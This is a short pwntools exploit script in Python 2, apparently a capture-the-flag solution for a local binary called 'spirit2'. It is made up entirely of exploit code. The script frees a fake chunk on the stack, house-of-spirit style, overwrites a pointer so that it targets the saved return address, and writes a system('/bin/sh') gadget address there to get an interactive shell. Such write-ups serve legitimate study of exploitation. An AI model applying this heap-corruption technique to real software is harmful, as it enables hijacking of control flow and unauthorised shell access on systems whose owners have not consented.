# spirit2.py
from pwn import *
p = process("./spirit2")
def add(size):
	print p.sendlineafter(">","1")
	print p.sendlineafter(":",str(size))
def free(addr):
	print p.sendlineafter(">","2")
	print p.sendlineafter(":",str(addr))
def edit(idx,data):
	print p.sendlineafter(">","3")
	print p.sendlineafter(":",str(idx))
	print p.sendafter("",str(data))
def ret():
	print p.sendlineafter(">","6")
elf = ELF('./spirit2')

size_stack = int(p.recvuntil("\n").strip("\n"),16)
rip = size_stack + 0xd0
free_ptr = size_stack + 8
print hex(size_stack)
print hex(rip)
add(0x61)
free(free_ptr)
add(0x50) # 0x50 + 16 = 0x60 
edit(1, "A"*16 + p64(rip)) # change pointer 0
systembinsh = 0x40083b
payload = p64(systembinsh)
edit(0, payload)
ret()
p.interactive()